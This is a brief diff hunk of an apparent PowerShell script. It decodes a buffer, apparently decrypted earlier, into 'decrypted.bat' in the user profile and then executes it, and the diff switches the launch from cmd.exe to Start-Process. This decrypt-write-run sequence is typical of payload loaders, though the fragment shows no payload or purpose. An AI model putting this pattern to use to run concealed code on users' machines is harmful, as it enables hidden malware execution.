@@ -18,4 +18,5 @@ $path = "$env:USERPROFILE\decrypted.bat"
 $text = [Text.Encoding]::UTF8.GetString($out)
 
 Set-Content -Path $path -Value $text
-cmd.exe /c $path
+
+Start-Process -FilePath $path
